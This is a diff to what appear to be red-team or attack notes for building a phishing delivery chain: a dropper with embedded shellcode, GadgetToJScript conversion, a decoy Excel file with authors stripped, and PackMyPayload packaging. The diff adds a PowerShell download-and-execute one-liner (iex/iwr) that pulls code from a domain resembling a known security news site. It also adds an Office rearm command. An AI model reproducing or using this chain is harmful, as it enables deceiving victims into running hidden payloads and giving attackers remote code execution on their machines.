@@ -6,7 +6,7 @@
 
 > Place in the same directory: Checked
 
-3. Add _http_x64.xprocess.bin_ (shellcode) as an embedded resource.
+3. Add _**http_x64.xprocess.bin**_ (shellcode) as an embedded resource.
 	1. Right-click on the project in the Solution Explorer and go to **Add > Existing Item**.  
 	2. Select a payload file to embed in the dropper, e.g. `http_x64.exe`
 	3. Then in its properties, change the **Build Action** to **Embedded Resource**.
@@ -21,6 +21,7 @@ C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a .\so
 
 #### Decoy, Trigger, Container
 
+ > & 'C:\Program Files\Microsoft Office\Office16\OSPPREARM.EXE'
 1. Create decoy Excel spreadsheet file and save in deals directory
 
 > **Remove the authors from the document**
@@ -79,4 +80,8 @@ python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,deals.js /mnt/
 
 ```
 iexplore www.bleepincomputer.com
+```
+
+```powershell
+iex(iwr "http://www.bleepincomputer.com/demo" -useb)
 ```
